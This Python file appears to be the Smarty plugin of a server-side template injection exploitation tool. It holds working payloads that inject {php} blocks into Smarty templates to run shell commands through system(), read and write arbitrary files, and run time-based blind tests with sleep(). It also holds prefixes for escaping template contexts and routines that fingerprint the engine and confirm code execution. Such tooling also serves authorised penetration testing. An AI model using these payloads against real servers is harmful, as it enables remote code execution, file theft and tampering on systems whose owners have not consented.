from core import closures
from core.plugin import Plugin
from utils.loggers import log
from utils import rand
from utils.strings import quote
import base64

class Smarty(Plugin):

    actions = {
        'render' : {
            'render': '{%(code)s}',
            'header': '{%(header)s}',
            'trailer': '{%(trailer)s}'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """$d="%(chunk)s"; file_put_contents("%(path)s", base64_decode(str_pad(strtr($d, '-_', '+/'), strlen($d)%%4,'=',STR_PAD_RIGHT)),FILE_APPEND);""",
            'truncate' : """file_put_contents("%(path)s", "");"""
        },
        'read' : {
            'call': 'evaluate',
            'read' : """print(base64_encode(file_get_contents("%(path)s")));"""
        },
        'md5' : {
            'call': 'evaluate',
            'md5': """is_file("%(path)s") && print(md5_file("%(path)s"));"""
        },
        'evaluate' : {
            'call': 'render',
            'evaluate': """{php}%(code)s{/php}"""
        },
        'execute' : {
            'call': 'evaluate',
            'execute': """system("%(code)s");"""
        },
        'blind' : {
            'call': 'evaluate_blind',
            'bool_true' : """TRUE""",
            'bool_false' : 'FALSE'
        },
        'evaluate_blind' : {
            'call': 'evaluate',
            'evaluate_blind': """%(code)s and sleep(%(delay)i);"""
        }

    }

    contexts = [
    
        # Text context, no closures
        { 'level': 0 },
    
        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '{', 'closures' : closures.php_ctx_closures },

        # {config_load file="missing_file"} raises an exception

        # Escape Ifs
        { 'level': 5, 'prefix': '%(closure)s}{/if}{if 1}', 'suffix' : '', 'closures' : closures.php_ctx_closures },

        # Escape {assign var="%s" value="%s"}
        { 'level': 5, 'prefix': '%(closure)s var="" value=""}{assign var="" value=""}', 'suffix' : '', 'closures' : closures.php_ctx_closures },


    ]

    def detect_engine(self):

        randA = rand.randstr_n(1)
        randB = rand.randstr_n(1)

        payload = '%s{*%s*}%s' % (randA, rand.randstr_n(1), randB)
        expected = randA + randB

        if expected == self.render(payload):
            self.set('language', 'php')
            self.set('engine', 'smarty')

    def detect_eval(self):

        expected_rand = str(rand.randint_n(1))
        payload = """print('%s');""" % expected_rand

        result_php_tag = self.evaluate(payload)

        # If {php} is sent back means is in secure mode
        if expected_rand == result_php_tag:
            self.set('evaluate', 'php')
            self.set('os', self.evaluate('echo PHP_OS;'))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('execute', True)

    def detect_blind_engine(self):

        if not self.get('blind'):
            return

        self.set('language', 'php')
        self.set('engine', 'smarty')
        self.set('evaluate', 'php')